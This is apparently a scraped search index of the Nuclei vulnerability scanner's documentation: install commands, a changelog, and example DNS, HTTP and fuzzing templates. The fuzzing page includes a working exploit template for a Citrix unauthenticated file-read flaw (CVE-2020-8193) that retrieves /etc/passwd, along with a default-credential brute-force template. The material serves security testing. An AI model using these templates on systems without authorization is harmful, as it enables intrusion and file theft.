{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"","title":"Index"},{"location":"nuclei/get-started/","text":"Installing using Source \u00b6 Nuclei requires latest go version to install successfully, run the following command to install it using source - GO111MODULE = on go get -u -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei Installing using Binary \u00b6 Download latest binary based on your operating system from the release page. tar -xzvf nuclei-linux-amd64.tar.gz mv nuclei /usr/bin/ nuclei -h Installing using Github \u00b6 You can also install by cloning the Github project and build it manually. git clone https://github.com/projectdiscovery/nuclei.git cd nuclei/v2/cmd/nuclei/ go build . mv nuclei /usr/local/bin/ nuclei -h Installing using Docker \u00b6 We update nuclei dockerhub image on every release, you can simply pull the dockerhub image to run. docker pull projectdiscovery/nuclei Features \u00b6 False positive free results. \u00b6 Fully configurable templates. \u00b6 Large scale scanning. \u00b6 Write your own templates. \u00b6 Using nuclei \u00b6 Running single template \u00b6 nuclei -l urls.txt -t files/git-core.yaml -o git-core.txt Running multiple templates \u00b6 nuclei -l urls.txt -t files/ -t tokens/ -t cves/ -o output.txt Running with docker \u00b6 cat urls.txt | docker run -v /path-to-nuclei-templates:/go/src/app/ -i projectdiscovery/nuclei -t ./files/git-config.yaml > results.txt Automation integration \u00b6 subfinder -dL domains.txt -silent | httpx -silent | nuclei -t cves/ -o cves.txt Code contribution \u00b6 Nuclei templates are base of this tool, we appreciate if you can write and submit new templates to keep this project alive, and one of the reason to keep us motivated to keep working on this project. License \u00b6 MIT License Copyright (c) 2020 Exposed Atoms Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.","title":"Install"},{"location":"nuclei/get-started/#installing-using-source","text":"Nuclei requires latest go version to install successfully, run the following command to install it using source - GO111MODULE = on go get -u -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei","title":"Installing using Source"},{"location":"nuclei/get-started/#installing-using-binary","text":"Download latest binary based on your operating system from the release page. tar -xzvf nuclei-linux-amd64.tar.gz mv nuclei /usr/bin/ nuclei -h","title":"Installing using Binary"},{"location":"nuclei/get-started/#installing-using-github","text":"You can also install by cloning the Github project and build it manually. git clone https://github.com/projectdiscovery/nuclei.git cd nuclei/v2/cmd/nuclei/ go build . mv nuclei /usr/local/bin/ nuclei -h","title":"Installing using Github"},{"location":"nuclei/get-started/#installing-using-docker","text":"We update nuclei dockerhub image on every release, you can simply pull the dockerhub image to run. docker pull projectdiscovery/nuclei","title":"Installing using Docker"},{"location":"nuclei/get-started/#features","text":"","title":"Features"},{"location":"nuclei/get-started/#false-positive-free-results","text":"","title":"False positive free results."},{"location":"nuclei/get-started/#fully-configurable-templates","text":"","title":"Fully configurable templates."},{"location":"nuclei/get-started/#large-scale-scanning","text":"","title":"Large scale scanning."},{"location":"nuclei/get-started/#write-your-own-templates","text":"","title":"Write your own templates."},{"location":"nuclei/get-started/#using-nuclei","text":"","title":"Using nuclei"},{"location":"nuclei/get-started/#running-single-template","text":"nuclei -l urls.txt -t files/git-core.yaml -o git-core.txt","title":"Running single template"},{"location":"nuclei/get-started/#running-multiple-templates","text":"nuclei -l urls.txt -t files/ -t tokens/ -t cves/ -o output.txt","title":"Running multiple templates"},{"location":"nuclei/get-started/#running-with-docker","text":"cat urls.txt | docker run -v /path-to-nuclei-templates:/go/src/app/ -i projectdiscovery/nuclei -t ./files/git-config.yaml > results.txt","title":"Running with docker"},{"location":"nuclei/get-started/#automation-integration","text":"subfinder -dL domains.txt -silent | httpx -silent | nuclei -t cves/ -o cves.txt","title":"Automation integration"},{"location":"nuclei/get-started/#code-contribution","text":"Nuclei templates are base of this tool, we appreciate if you can write and submit new templates to keep this project alive, and one of the reason to keep us motivated to keep working on this project.","title":"Code contribution"},{"location":"nuclei/get-started/#license","text":"MIT License Copyright (c) 2020 Exposed Atoms Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.","title":"License"},{"location":"releases/changelog/","text":"Changelog \u00b6 Nuclei v2.2.0 - 20 Nov 2020 \u00b6 Added Turbo intruder support for fuzzing Added HTTP pipeline support for fuzzing Added Connection pooling support for fuzzing Added Raw HTTP support for malformed HTTP requests. Added support for Race condition testing Added \u00a7variable\u00a7 marker for fuzzing Added stats in multithreaded requests (fuzzing) Added YAML syntax support for workflows Added Project file support for request reuse Added global rate limit support Added burp collaborator support Added hmap for reducing memory uses Added clistats in place of a progress bar Added support to DSL matcher to match each unique request Added trace log ( -trace-log ) support Added -templates-version flag to list template version Added -no-meta flag to ignore meta information Added dynamic field support in the template info block Added bulk-size flag Added response time support to DSL Added type to specify type of request Added mmh3 hashing support in helper functions Added shared resolver cache among various HTTP clients Added fuzzing payloads output values to json output Added .nuclei-ignore file from current working directory Added comments support in .nuclei-ignore file Added stop-at-first-match flag Added flag to disable host header and content length Added host information in the JSON response by @savushkin-yauheni Updated flag nC to no-color Updated flag json-requests to include-rr Updated flag pbar to stats Fixed a bug with ignoring paths in the input file by @vzamanillo Fixed a bug with raw requests redirect Fixed a bug with debug flag to display post body Fixed a panic with trace log Nuclei v2.1.1 \u00b6 Added negative matcher support Added support for severity based filtering with severity flag by @manuelbua Added support for template exclusions with exclude flag by @manuelbua Added .nuclei-ignore file support Added rate limit per host with rl flag by @CasperGN Added template list support with tl flag by @vzamanillo Added template name field in JSON output by @vzamanillo Added color support for severity by @vzamanillo Added Progress bar support with the silent flag by @vzamanillo Added support for using local templates along with nuclei-templates Added template preloading at the start of the scan Added support for golangci lint by @vzamanillo Added JSON output support for DNS templates by @Marmelatze Added centralize template loaded info message, add output coloring by @manuelbua Added template ID on HTTP request error message @vzamanillo Added severity information in the output by @vzamanillo Added match groups support in regex extractor Fixed a failed request error on multiple URLs Fixed a bug with helper function by @organiccrap Fixed a bug with port conflict input with URLs and templates by @vzamanillo Fixed a bug with Workflow detecting No Results by @vzamanillo Fixed inconsistent output printing in the terminal Fixed No JSON output with workflows Fixed a bug with matches when multiple headers with the same name by @CasperGN Fixed No result found problem with and condition by @Marmelatze Fixed an issue with all matched part by @rykkard Updated nuclei-templates current and outdated messages Updated template loading UI message by @vzamanillo Nuclei v2.1.0 \u00b6 Nuclei engine rework. Added Progress bar with live results by @manuelbua Added multiple input template support by @manuelbua Added in-template cookie reuse Added key-value supported extractor Added dynamic extraction and reuse Added coloring support in output results by @manuelbua Added wild-card template input support by @wdahlenburg Fixed relative path issue with payloads. Fixed dockerfile go version. Nuclei v2.0.4 \u00b6 Better error handling for templates by @manuelbua Fixed an issue with release binary. Nuclei v2.0.3 \u00b6 Fixed bugs in raw-requests. Fixed update template issue. Nuclei v2.0.2 \u00b6 Fixed an issue with failed requests. Nuclei v2.0.1 \u00b6 Fixed an issue with DSL helper function. Fixed error with auto-updates Github rate limit. Fixed defaults to OR condition when no condition is specified. Nuclei v2.0.0 \u00b6 Fixed raw requests newlines and allow blank request path. Added relative path and auto-template fetching support from installed directory. Added single target support. Added json output support. Chained workflow support with conditions etc. Added template updates feature with auto-updates, etc. Fixed blank output file bug. Nuclei v1.1.7 \u00b6 Added better verbose and debug modes. Inform user and no output file in case of 0 results. Nuclei v1.1.6 \u00b6 Updated default user-agent to include project details Nuclei v1.1.5 \u00b6 Added intruder like support (sniper/pitchfork/clusterbomb) Fuzzing with DSL helpers Fixed bug in body decompression Added global headers via CLI Nuclei v1.1.4 \u00b6 Small improvements. General Fixes. Nuclei v1.1.3 \u00b6 Complex DSL queries Raw requests Proxy (http/socks5) Nuclei v1.1.2 \u00b6 Fixed a bug with DNS requests and output file. Nuclei v1.1.1 \u00b6 Massive code refactor, conditions support + stdin input bug fix. DNS requests support Binary Matcher support Conditional redirects support within templates. Nuclei v1.1.0 \u00b6 Fixed go.mod issue Added extractors for custom text extraction from templates Fixed a bug with default headers Nuclei v1.0.1 \u00b6 Fixed go.mod file issue Nuclei v1.0.0 \u00b6 Initial Release","title":"Nuclei"},{"location":"releases/changelog/#changelog","text":"","title":"Changelog"},{"location":"releases/changelog/#nuclei-v220-20-nov-2020","text":"Added Turbo intruder support for fuzzing Added HTTP pipeline support for fuzzing Added Connection pooling support for fuzzing Added Raw HTTP support for malformed HTTP requests. Added support for Race condition testing Added \u00a7variable\u00a7 marker for fuzzing Added stats in multithreaded requests (fuzzing) Added YAML syntax support for workflows Added Project file support for request reuse Added global rate limit support Added burp collaborator support Added hmap for reducing memory uses Added clistats in place of a progress bar Added support to DSL matcher to match each unique request Added trace log ( -trace-log ) support Added -templates-version flag to list template version Added -no-meta flag to ignore meta information Added dynamic field support in the template info block Added bulk-size flag Added response time support to DSL Added type to specify type of request Added mmh3 hashing support in helper functions Added shared resolver cache among various HTTP clients Added fuzzing payloads output values to json output Added .nuclei-ignore file from current working directory Added comments support in .nuclei-ignore file Added stop-at-first-match flag Added flag to disable host header and content length Added host information in the JSON response by @savushkin-yauheni Updated flag nC to no-color Updated flag json-requests to include-rr Updated flag pbar to stats Fixed a bug with ignoring paths in the input file by @vzamanillo Fixed a bug with raw requests redirect Fixed a bug with debug flag to display post body Fixed a panic with trace log","title":"Nuclei v2.2.0 - 20 Nov 2020"},{"location":"releases/changelog/#nuclei-v211","text":"Added negative matcher support Added support for severity based filtering with severity flag by @manuelbua Added support for template exclusions with exclude flag by @manuelbua Added .nuclei-ignore file support Added rate limit per host with rl flag by @CasperGN Added template list support with tl flag by @vzamanillo Added template name field in JSON output by @vzamanillo Added color support for severity by @vzamanillo Added Progress bar support with the silent flag by @vzamanillo Added support for using local templates along with nuclei-templates Added template preloading at the start of the scan Added support for golangci lint by @vzamanillo Added JSON output support for DNS templates by @Marmelatze Added centralize template loaded info message, add output coloring by @manuelbua Added template ID on HTTP request error message @vzamanillo Added severity information in the output by @vzamanillo Added match groups support in regex extractor Fixed a failed request error on multiple URLs Fixed a bug with helper function by @organiccrap Fixed a bug with port conflict input with URLs and templates by @vzamanillo Fixed a bug with Workflow detecting No Results by @vzamanillo Fixed inconsistent output printing in the terminal Fixed No JSON output with workflows Fixed a bug with matches when multiple headers with the same name by @CasperGN Fixed No result found problem with and condition by @Marmelatze Fixed an issue with all matched part by @rykkard Updated nuclei-templates current and outdated messages Updated template loading UI message by @vzamanillo","title":"Nuclei v2.1.1"},{"location":"releases/changelog/#nuclei-v210","text":"Nuclei engine rework. Added Progress bar with live results by @manuelbua Added multiple input template support by @manuelbua Added in-template cookie reuse Added key-value supported extractor Added dynamic extraction and reuse Added coloring support in output results by @manuelbua Added wild-card template input support by @wdahlenburg Fixed relative path issue with payloads. Fixed dockerfile go version.","title":"Nuclei v2.1.0"},{"location":"releases/changelog/#nuclei-v204","text":"Better error handling for templates by @manuelbua Fixed an issue with release binary.","title":"Nuclei v2.0.4"},{"location":"releases/changelog/#nuclei-v203","text":"Fixed bugs in raw-requests. Fixed update template issue.","title":"Nuclei v2.0.3"},{"location":"releases/changelog/#nuclei-v202","text":"Fixed an issue with failed requests.","title":"Nuclei v2.0.2"},{"location":"releases/changelog/#nuclei-v201","text":"Fixed an issue with DSL helper function. Fixed error with auto-updates Github rate limit. Fixed defaults to OR condition when no condition is specified.","title":"Nuclei v2.0.1"},{"location":"releases/changelog/#nuclei-v200","text":"Fixed raw requests newlines and allow blank request path. Added relative path and auto-template fetching support from installed directory. Added single target support. Added json output support. Chained workflow support with conditions etc. Added template updates feature with auto-updates, etc. Fixed blank output file bug.","title":"Nuclei v2.0.0"},{"location":"releases/changelog/#nuclei-v117","text":"Added better verbose and debug modes. Inform user and no output file in case of 0 results.","title":"Nuclei v1.1.7"},{"location":"releases/changelog/#nuclei-v116","text":"Updated default user-agent to include project details","title":"Nuclei v1.1.6"},{"location":"releases/changelog/#nuclei-v115","text":"Added intruder like support (sniper/pitchfork/clusterbomb) Fuzzing with DSL helpers Fixed bug in body decompression Added global headers via CLI","title":"Nuclei v1.1.5"},{"location":"releases/changelog/#nuclei-v114","text":"Small improvements. General Fixes.","title":"Nuclei v1.1.4"},{"location":"releases/changelog/#nuclei-v113","text":"Complex DSL queries Raw requests Proxy (http/socks5)","title":"Nuclei v1.1.3"},{"location":"releases/changelog/#nuclei-v112","text":"Fixed a bug with DNS requests and output file.","title":"Nuclei v1.1.2"},{"location":"releases/changelog/#nuclei-v111","text":"Massive code refactor, conditions support + stdin input bug fix. DNS requests support Binary Matcher support Conditional redirects support within templates.","title":"Nuclei v1.1.1"},{"location":"releases/changelog/#nuclei-v110","text":"Fixed go.mod issue Added extractors for custom text extraction from templates Fixed a bug with default headers","title":"Nuclei v1.1.0"},{"location":"releases/changelog/#nuclei-v101","text":"Fixed go.mod file issue","title":"Nuclei v1.0.1"},{"location":"releases/changelog/#nuclei-v100","text":"Initial Release","title":"Nuclei v1.0.0"},{"location":"template-examples/dns/","text":"Basic template \u00b6 id : basic-dns-example info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\" Multiple matcher \u00b6 id : multiple-matcher info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 5 matchers-condition : or matchers : - type : word name : zendesk words : - \"zendesk.com\" - type : word name : github words : - \"github.io\"","title":"DNS"},{"location":"template-examples/dns/#basic-template","text":"id : basic-dns-example info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\"","title":"Basic template"},{"location":"template-examples/dns/#multiple-matcher","text":"id : multiple-matcher info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 5 matchers-condition : or matchers : - type : word name : zendesk words : - \"zendesk.com\" - type : word name : github words : - \"github.io\"","title":"Multiple matcher"},{"location":"template-examples/fuzzing/","text":"HTTP Intruder fuzzing \u00b6 id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info # HTTP Intruder fuzzing with in template payload support. requests : - payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Available types: sniper, pitchfork and clusterbomb raw : - | POST /?username=\u00a7username\u00a7&paramb=\u00a7password\u00a7 HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) Host: {{Hostname}} another_header: {{base64(\"password\")}} Accept: */* body=test matchers : - type : word words : - \"Test is test matcher text\" Fuzzing multiple requests \u00b6 id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : # HTTP Intruder fuzzing wordlist based payload support. - payloads : param_a : payloads/prams.txt param_b : payloads/paths.txt attack : clusterbomb # Available types: sniper, pitchfork and clusterbomb raw : # Request with simple param and header manipulation with DSL functions - | POST /?param_a=\u00a7param_a\u00a7&paramb=\u00a7param_b\u00a7 HTTP/1.1 User-Agent: \u00a7param_a\u00a7 Host: {{Hostname}} another_header: {{base64(param_b)}} Accept: */* admin=test # Request with body with DSL helper manipulation - | DELETE / HTTP/1.1 User-Agent: nuclei Host: {{Hostname}} {{sha256(param_a)}} - | PUT / HTTP/1.1 Host: {{Hostname}} {{html_escape(param_a)}} + {{hex_encode(param_b))}} matchers : - type : word words : - \"Test is test matcher text\" Authenticated fuzzing \u00b6 id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 testing=parameter # Cookie-reuse maintain the session between all request like browser. cookie-reuse : true matchers : - type : word words : - \"Test is test matcher text\" Dynamic variable support \u00b6 id : CVE-2020-8193 info : name : Citrix unauthenticated LFI author : pdteam severity : high # Source:- https://github.com/jas502n/CVE-2020-8193 requests : - raw : - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Content-Type: application/xml X-NITRO-USER: xpyZxwy6 X-NITRO-PASS: xWXHUJ56 <appfwprofile><login></login></appfwprofile> - | GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/neo HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/stc HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <appfwprofile><login></login></appfwprofile> - | POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <clipermission></clipermission> cookie-reuse : true # Using cookie-reuse to maintain session between each request, same as browser. extractors : - type : regex name : randkey part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" # Using rand_key as dynamic variable to make use of extractors at run time. matchers : - type : regex regex : - \"root:[x*]:0:0:\" part : body","title":"Fuzzing"},{"location":"template-examples/fuzzing/#http-intruder-fuzzing","text":"id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info # HTTP Intruder fuzzing with in template payload support. requests : - payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Available types: sniper, pitchfork and clusterbomb raw : - | POST /?username=\u00a7username\u00a7&paramb=\u00a7password\u00a7 HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) Host: {{Hostname}} another_header: {{base64(\"password\")}} Accept: */* body=test matchers : - type : word words : - \"Test is test matcher text\"","title":"HTTP Intruder fuzzing"},{"location":"template-examples/fuzzing/#fuzzing-multiple-requests","text":"id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : # HTTP Intruder fuzzing wordlist based payload support. - payloads : param_a : payloads/prams.txt param_b : payloads/paths.txt attack : clusterbomb # Available types: sniper, pitchfork and clusterbomb raw : # Request with simple param and header manipulation with DSL functions - | POST /?param_a=\u00a7param_a\u00a7&paramb=\u00a7param_b\u00a7 HTTP/1.1 User-Agent: \u00a7param_a\u00a7 Host: {{Hostname}} another_header: {{base64(param_b)}} Accept: */* admin=test # Request with body with DSL helper manipulation - | DELETE / HTTP/1.1 User-Agent: nuclei Host: {{Hostname}} {{sha256(param_a)}} - | PUT / HTTP/1.1 Host: {{Hostname}} {{html_escape(param_a)}} + {{hex_encode(param_b))}} matchers : - type : word words : - \"Test is test matcher text\"","title":"Fuzzing multiple requests"},{"location":"template-examples/fuzzing/#authenticated-fuzzing","text":"id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 testing=parameter # Cookie-reuse maintain the session between all request like browser. cookie-reuse : true matchers : - type : word words : - \"Test is test matcher text\"","title":"Authenticated fuzzing"},{"location":"template-examples/fuzzing/#dynamic-variable-support","text":"id : CVE-2020-8193 info : name : Citrix unauthenticated LFI author : pdteam severity : high # Source:- https://github.com/jas502n/CVE-2020-8193 requests : - raw : - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Content-Type: application/xml X-NITRO-USER: xpyZxwy6 X-NITRO-PASS: xWXHUJ56 <appfwprofile><login></login></appfwprofile> - | GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/neo HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/stc HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <appfwprofile><login></login></appfwprofile> - | POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <clipermission></clipermission> cookie-reuse : true # Using cookie-reuse to maintain session between each request, same as browser. extractors : - type : regex name : randkey part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" # Using rand_key as dynamic variable to make use of extractors at run time. matchers : - type : regex regex : - \"root:[x*]:0:0:\" part : body","title":"Dynamic variable support"},{"location":"template-examples/http/","text":"Basic Template \u00b6 id : basic-example info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers : - type : word words : - \"This is test matcher text\" Multiple matchers \u00b6 id : http-multiple-matchers info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" part : header Matchers with conditions \u00b6 id : matchers-conditions info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : and part : header - type : word words : - \"PHP\" part : body Multiple matcher conditions \u00b6 id : multiple-matchers-conditions info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - PHP part : body Custom headers \u00b6 id : custom-headers info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET # Example of sending some headers to the servers headers : X-Client-IP : 127.0.0.1 X-Remote-IP : 127.0.0.1 X-Remote-Addr : 127.0.0.1 X-Forwarded-For : 127.0.0.1 X-Originating-IP : 127.0.0.1 path : - \"{{BaseURL}}/server-status\" matchers : - type : word words : - Apache Server Status - Server Version condition : and POST requests \u00b6 id : post-request info : name : Test HTTP Template author : pdteam severity : info requests : - method : POST path : - \"{{BaseURL}}/admin\" body : 'admin=test' matchers : - type : word words : - Welcome Admin","title":"HTTP"},{"location":"template-examples/http/#basic-template","text":"id : basic-example info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers : - type : word words : - \"This is test matcher text\"","title":"Basic Template"},{"location":"template-examples/http/#multiple-matchers","text":"id : http-multiple-matchers info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" part : header","title":"Multiple matchers"},{"location":"template-examples/http/#matchers-with-conditions","text":"id : matchers-conditions info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : and part : header - type : word words : - \"PHP\" part : body","title":"Matchers with conditions"},{"location":"template-examples/http/#multiple-matcher-conditions","text":"id : multiple-matchers-conditions info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - PHP part : body","title":"Multiple matcher conditions"},{"location":"template-examples/http/#custom-headers","text":"id : custom-headers info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET # Example of sending some headers to the servers headers : X-Client-IP : 127.0.0.1 X-Remote-IP : 127.0.0.1 X-Remote-Addr : 127.0.0.1 X-Forwarded-For : 127.0.0.1 X-Originating-IP : 127.0.0.1 path : - \"{{BaseURL}}/server-status\" matchers : - type : word words : - Apache Server Status - Server Version condition : and","title":"Custom headers"},{"location":"template-examples/http/#post-requests","text":"id : post-request info : name : Test HTTP Template author : pdteam severity : info requests : - method : POST path : - \"{{BaseURL}}/admin\" body : 'admin=test' matchers : - type : word words : - Welcome Admin","title":"POST requests"},{"location":"template-examples/raw/","text":"Basic template \u00b6 id : basic-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 matchers : - type : word words : - \"Test is test matcher text\" Multiple RAW request \u00b6 id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 testing=parameter matchers : - type : word words : - \"Test is test matcher text\"","title":"RAW HTTP"},{"location":"template-examples/raw/#basic-template","text":"id : basic-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 